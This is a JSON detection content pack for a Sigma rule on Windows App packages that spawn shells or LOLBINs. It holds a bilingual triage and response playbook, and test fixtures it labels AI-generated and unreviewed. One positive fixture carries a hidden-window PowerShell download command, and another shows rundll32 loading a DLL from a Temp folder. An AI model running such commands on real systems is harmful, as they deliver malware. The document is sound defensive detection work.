@@ -1,0 +1,130 @@
+{
+  "rule": {
+    "id": "f91ed517-a6ba-471d-9910-b3b4a398c0f3",
+    "title": "Potentially Suspicious Windows App Activity",
+    "level": "medium",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_susp_appx_execution.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_susp_appx_execution.yml",
+    "license": "DRL-1.1",
+    "techniques": []
+  },
+  "playbook": {
+    "es": {
+      "summary": "Una aplicación instalada en C:\\Program Files\\WindowsApps lanzó un intérprete o LOLBIN (cmd, PowerShell, mshta, rundll32, etc.), o un proceso con una línea de comandos sospechosa. Esto puede indicar un paquete .appx/.msix malicioso en ejecución.",
+      "what_it_detects": "Eventos de creación de procesos donde ParentImage contiene 'C:\\Program Files\\WindowsApps\\' y la Image termina en un intérprete o LOLBIN conocido, o el CommandLine contiene 'cmd /c', 'Invoke-' o 'Base64'. Se excluyen Windows Terminal lanzando sus shells y Sysinternals Suite lanzando cmd.exe.",
+      "why_it_matters": "Los atacantes distribuyen paquetes de aplicaciones falsos que parecen legítimos e instalan malware en una ruta de confianza. Abusar del mecanismo de apps de Windows ayuda a evadir controles y ocultar la ejecución (sigilo/evasión de defensas).",
+      "triage_steps": [
+        "Identifique el paquete en ParentImage (nombre, versión, publisher) y verifique si es una aplicación aprobada en el inventario de la organización.",
+        "Revise CommandLine del proceso hijo: busque descargas, contenido Base64, cmdlets Invoke- o ejecución de DLL/scripts desde rutas de usuario.",
+        "Consulte el evento de instalación del paquete (AppXDeploymentServer/Operational) y su origen: navegador, enlace ms-appinstaller o archivo descargado.",
+        "Valide la firma del paquete y el hash del ejecutable padre; compare contra reputación interna y listas de aplicaciones permitidas.",
+        "Pivotee en el mismo host +/- 15 minutos: procesos hijos posteriores, conexiones de red, archivos creados y claves de persistencia.",
+        "Revise la actividad del mismo usuario: correos o descargas recientes que lo llevaron a instalar la app.",
+        "Busque el mismo ParentImage o hash del paquete en otros endpoints y alertas previas para la misma entidad."
+      ],
+      "false_positives": [
+        "Paquetes legítimos que invocan binarios externos, como Windows Terminal con perfiles o shells personalizados no cubiertos por el filtro.",
+        "Herramientas de desarrollo o administración distribuidas por Microsoft Store que ejecutan scripts de PowerShell o cmd.",
+        "Aplicaciones empresariales MSIX empaquetadas internamente que usan scripts de inicio o configuración."
+      ],
+      "response_steps": [
+        "Confirme con el usuario y el equipo de TI si la aplicación fue instalada intencionalmente y si su origen es confiable.",
+        "Si es malicioso, aísle el endpoint y conserve evidencia: paquete, archivos descargados, memoria y logs de AppX.",
+        "Elimine el paquete con Remove-AppxPackage tras verificarlo, junto con los artefactos y mecanismos de persistencia identificados.",
+        "Bloquee el hash, el publisher y los dominios relacionados; restrinja la instalación de paquetes no firmados o de fuentes externas (ms-appinstaller).",
+        "Restablezca credenciales del usuario si hubo ejecución de payloads, y documente la exclusión si se confirma un falso positivo recurrente."
+      ],
+      "severity_rationale": "Nivel medio porque el patrón es un indicador fuerte de paquetes .appx maliciosos, pero algunas aplicaciones legítimas lanzan shells y requieren validación de contexto."
+    },
+    "en": {
+      "summary": "An application installed under C:\\Program Files\\WindowsApps spawned a script interpreter or LOLBIN (cmd, PowerShell, mshta, rundll32, etc.) or a process with a suspicious command line. This may mean a rogue .appx/.msix package is running.",
+      "what_it_detects": "Process creation events where ParentImage contains 'C:\\Program Files\\WindowsApps\\' and the Image ends with a known interpreter or LOLBIN, or the CommandLine contains 'cmd /c', 'Invoke-' or 'Base64'. Windows Terminal launching its shells and Sysinternals Suite launching cmd.exe are excluded.",
+      "why_it_matters": "Attackers ship fake app packages that look legitimate and drop malware from a trusted install path. Abusing the Windows apps mechanism helps them evade controls and hide execution (stealth/defense evasion).",
+      "triage_steps": [
+        "Identify the package in ParentImage (name, version, publisher) and check whether it is an approved application in your inventory.",
+        "Review the child CommandLine: look for downloads, Base64 content, Invoke- cmdlets, or DLL/script execution from user-writable paths.",
+        "Find the package installation event (AppXDeploymentServer/Operational) and its source: browser, ms-appinstaller link or downloaded file.",
+        "Validate the package signature and the parent executable hash against internal reputation and allowlists.",
+        "Pivot on the same host +/- 15 minutes: later child processes, network connections, created files and persistence keys.",
+        "Review the same user's activity: recent emails or downloads that led to installing the app.",
+        "Search for the same ParentImage or package hash on other endpoints and in earlier alerts for the same entity."
+      ],
+      "false_positives": [
+        "Legitimate packages that call external binaries, such as Windows Terminal with custom shells or profiles not covered by the filter.",
+        "Developer or admin tools from the Microsoft Store that run PowerShell or cmd scripts.",
+        "Internally packaged enterprise MSIX apps that use startup or configuration scripts."
+      ],
+      "response_steps": [
+        "Confirm with the user and IT whether the app was installed intentionally and comes from a trusted source.",
+        "If malicious, isolate the endpoint and preserve evidence: the package, downloaded files, memory and AppX logs.",
+        "After verification, remove the package with Remove-AppxPackage plus any identified artifacts and persistence.",
+        "Block the hash, publisher and related domains; restrict sideloading and external ms-appinstaller sources.",
+        "Reset the user's credentials if payloads ran; document a tuned exclusion if a recurring false positive is confirmed."
+      ],
+      "severity_rationale": "Medium because this pattern strongly suggests rogue .appx packages, but some legitimate apps launch shells, so context must be validated."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Unknown Store-style app spawns PowerShell with an Invoke- download cradle",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Program Files\\WindowsApps\\SuperNotes.App_1.0.3.0_x64__k2p9x7d4m1qza\\app\\SuperNotes.exe",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri https://cdn.example.com/update.bin -OutFile $env:TEMP\\update.bin\"",
+          "ParentCommandLine": "\"C:\\Program Files\\WindowsApps\\SuperNotes.App_1.0.3.0_x64__k2p9x7d4m1qza\\app\\SuperNotes.exe\""
+        }
+      },
+      {
+        "description": "Packaged app launches rundll32 to load a DLL from the user's AppData",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0177.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "ParentImage": "C:\\Program Files\\WindowsApps\\PdfViewerPro_2.4.0.0_x64__8hq3vz1n0c5ty\\PdfViewerPro.exe",
+          "Image": "C:\\Windows\\System32\\rundll32.exe",
+          "CommandLine": "rundll32.exe C:\\Users\\mrojas\\AppData\\Local\\Temp\\helper.dll,Start",
+          "ParentCommandLine": "\"C:\\Program Files\\WindowsApps\\PdfViewerPro_2.4.0.0_x64__8hq3vz1n0c5ty\\PdfViewerPro.exe\""
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Windows Terminal launching PowerShell 7 as its default profile (excluded by filter_optional_terminal)",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.21.2361.0_x64__8wekyb3d8bbwe\\WindowsTerminal.exe",
+          "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+          "CommandLine": "\"C:\\Program Files\\PowerShell\\7\\pwsh.exe\" -NoLogo",
+          "ParentCommandLine": "\"C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.21.2361.0_x64__8wekyb3d8bbwe\\WindowsTerminal.exe\""
+        }
+      },
+      {
+        "description": "Packaged app starts its WebView2 helper with a benign command line (not a listed binary or keyword)",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0201.andes.example.com",
+          "User": "ANDES\\lgarcia",
+          "ParentImage": "C:\\Program Files\\WindowsApps\\Microsoft.Todos_2.114.7122.0_x64__8wekyb3d8bbwe\\Todo.exe",
+          "Image": "C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\128.0.2739.79\\msedgewebview2.exe",
+          "CommandLine": "\"C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\128.0.2739.79\\msedgewebview2.exe\" --embedded-browser-webview=1 --webview-exe-name=Todo.exe",
+          "ParentCommandLine": "\"C:\\Program Files\\WindowsApps\\Microsoft.Todos_2.114.7122.0_x64__8wekyb3d8bbwe\\Todo.exe\" -ServerName:App.AppX"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
